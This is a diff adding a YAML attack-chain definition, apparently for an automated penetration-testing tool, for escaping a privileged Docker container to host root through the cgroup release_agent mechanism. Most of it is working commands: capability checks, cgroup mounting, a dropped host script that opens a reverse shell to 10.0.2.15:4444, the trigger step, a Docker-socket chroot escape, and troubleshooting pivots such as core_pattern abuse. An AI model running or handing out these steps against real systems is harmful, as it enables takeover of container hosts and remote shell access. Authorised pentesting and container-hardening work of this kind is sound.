@@ -1,0 +1,76 @@
+chain_id: privileged_container_escape
+title: "Container escape — privileged container → host root via cgroup release_agent"
+severity: CRITICAL
+tags: [container, docker, escape, cgroup, release-agent, privesc]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)docker|containerd|kubelet" }
+    - { path_pattern: "(?i)/var/run/docker\\.sock|/proc/self/cgroup" }
+    - { kind: "container_escape_candidate" }
+
+description: |
+  A container started with `--privileged` (or with `CAP_SYS_ADMIN` and
+  the host cgroup v1 hierarchy mounted writable) can mount any
+  cgroup, set its `notify_on_release=1`, and write a `release_agent`
+  that runs **on the host** as root the moment the cgroup empties.
+  Classic, still works on most pre-cgroupv2 hosts (RHEL 7/8, older
+  Debian/Ubuntu LTS, many K8s nodes).
+
+steps:
+  - id: 1
+    title: "Confirm the container is privileged / has SYS_ADMIN"
+    command: |
+      cat /proc/self/status | grep -E 'CapEff|CapBnd'
+      cat /proc/self/cgroup
+      capsh --print | grep -i admin
+      ls -la /dev/  # privileged shows full /dev: sda*, etc.
+
+  - id: 2
+    title: "Mount a fresh cgroup we control"
+    command: |
+      mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+      mkdir /tmp/cgrp/x
+
+  - id: 3
+    title: "Wire release_agent to a host script we drop"
+    command: |
+      echo 1 > /tmp/cgrp/x/notify_on_release
+      host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab | head -1)
+      echo "$host_path/cmd" > /tmp/cgrp/release_agent
+      cat > /cmd <<'SH'
+      #!/bin/sh
+      id > /tmp/pwned
+      /bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'
+      SH
+      chmod +x /cmd
+
+  - id: 4
+    title: "Trigger by emptying the cgroup"
+    command: |
+      sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
+      # Listener on Kali first:  nc -lvnp 4444
+      # /cmd runs as root on the host the moment this shell exits.
+
+  - id: 5
+    title: "Alt path — Docker socket mounted inside the container"
+    command: |
+      ls -la /var/run/docker.sock 2>/dev/null && \
+        docker -H unix:///var/run/docker.sock run --rm -v /:/host \
+          -it alpine chroot /host /bin/bash
+
+common_errors:
+  - error: "mount: permission denied"
+    solution: |
+      Container is not actually privileged or kernel uses cgroup v2
+      (no release_agent). Pivot to /proc/sys/kernel/core_pattern abuse
+      (still works on cgroup v2 if /proc is rw and SYS_ADMIN is held).
+  - error: "/cmd never runs"
+    solution: |
+      The cgroup mount needs `perdir` mapping to the same host path
+      the parent container sees. Inspect /etc/mtab carefully; on
+      OverlayFS hosts, prefer the `LowerDir` value.
+
+references:
+  - https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/
+  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash
